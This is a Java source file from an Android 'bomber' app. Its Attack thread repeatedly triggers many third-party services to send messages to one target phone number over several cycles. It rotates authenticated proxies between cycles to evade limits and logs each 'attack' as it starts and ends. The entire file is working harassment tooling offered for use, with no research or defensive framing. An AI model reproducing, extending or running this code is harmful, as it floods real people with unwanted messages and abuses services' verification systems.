package com.dm.bomber.bomber;

import android.util.Log;

import com.dm.bomber.services.Service;
import com.dm.bomber.services.Services;

import org.jetbrains.annotations.NotNull;

import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class Attack extends Thread {
    private static final String TAG = "Attack";

    private final Callback callback;
    private final String countryCode;
    private final String phone;
    private final int numberOfCycles;
    private final List<AuthProxy> proxies;

    private int progress = 0;

    private CountDownLatch tasks;

    private static final OkHttpClient.Builder clientBuilder = new OkHttpClient.Builder()
            .callTimeout(10, TimeUnit.SECONDS)
            .addInterceptor(chain -> {
                Request request = chain.request();
                Log.v(TAG, String.format("Sending request %s", request.url()));

                Response response = chain.proceed(request);
                Log.v(TAG, String.format("Received response for %s with status code %s",
                        response.request().url(), response.code()));

                return response;
            });

    public Attack(Callback callback, String countryCode, String phone, int cycles, List<AuthProxy> proxies) {
        super(phone);

        this.callback = callback;
        this.countryCode = countryCode;
        this.phone = phone;
        this.proxies = proxies;

        numberOfCycles = cycles;
    }

    @Override
    public void run() {
        List<Service> usableServices = Services.getUsableServices(countryCode);

        callback.onAttackStart(usableServices.size(), numberOfCycles);
        Log.i(TAG, String.format("Starting attack on +%s%s", countryCode, phone));

        clientBuilder.proxy(null);

        OkHttpClient client = null;

        for (int cycle = 0; cycle < numberOfCycles; cycle++) {
            Log.i(TAG, String.format("Started cycle %s", cycle));
            tasks = new CountDownLatch(usableServices.size());

            if (!proxies.isEmpty()) {
                AuthProxy authProxy = proxies.get(cycle % proxies.size());

                clientBuilder.proxy(authProxy)
                        .proxyAuthenticator(authProxy);

                client = clientBuilder.build();
            }

            if (client == null)
                client = clientBuilder.build();

            for (Service service : usableServices) {
                try {
                    service.prepare(countryCode, phone);
                    service.run(client, new com.dm.bomber.services.Callback() {
                        @Override
                        public void onError(Exception e) {
                            Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
                            tasks.countDown();
                        }

                        @Override
                        public void onResponse(@NotNull Call call, @NotNull Response response) {
                            if (!response.isSuccessful()) {
                                Log.i(TAG, String.format("%s returned an error HTTP code: %s",
                                        service.getClass().getName(), response.code()));
                            }

                            tasks.countDown();
                            callback.onProgressChange(progress++);
                        }
                    });
                } catch (StringIndexOutOfBoundsException e) {
                    Log.w(TAG, String.format("%s could not process the number", service.getClass().getName()));
                }
            }

            try {
                tasks.await();
            } catch (InterruptedException e) {
                break;
            }
        }

        callback.onAttackEnd();
        Log.i(TAG, String.format("Attack on +%s%s ended", countryCode, phone));
    }
}
